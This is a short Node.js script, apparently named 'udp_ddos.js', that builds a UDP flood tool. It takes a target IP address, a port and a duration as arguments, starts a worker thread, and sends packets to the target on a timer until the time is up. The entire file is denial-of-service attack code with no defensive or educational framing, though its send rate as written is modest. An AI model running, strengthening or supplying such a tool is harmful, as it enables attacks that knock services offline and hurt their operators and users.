const dgram = require('dgram');
const { Worker, isMainThread } = require('worker_threads');

// UDP Flood Worker
function udpFloodWorker(target, port, duration) {
    const client = dgram.createSocket('udp4');
    let interval;

    client.on('error', (err) => {
        console.error(`UDP client error:\n${err.stack}`);
        client.close();
    });

    client.on('listening', () => {
        const address = client.address();
        console.log(`UDP flood sent to ${target}:${port}`);
    });

    client.bind();

    interval = setInterval(() => {
        const message = Buffer.from('Your message here');
        client.send(message, 0, message.length, port, target);
    }, 100);

    setTimeout(() => {
        clearInterval(interval);
        client.close();
        console.log('UDP flood stopped.');
    }, duration * 1000);
}

// Main function
function main() {
    if (isMainThread) {
        const target = process.argv[2]; // target IP address
        const duration = parseInt(process.argv[3], 10); // duration in seconds
        const udpPort = parseInt(process.argv[4], 10); // UDP port

        if (!target || !duration || !udpPort || isNaN(duration) || isNaN(udpPort)) {
            console.log('Usage: node udp_ddos.js <target_IP> <duration_seconds> <udp_port>');
            process.exit(1);
        }

        const udpWorker = new Worker(__filename, { workerData: { target, port: udpPort, duration } });

    } else {
        // Worker thread logic
        const { workerData } = require('worker_threads');
        const { target, port, duration } = workerData;
        udpFloodWorker(target, port, duration);
    }
}

main();
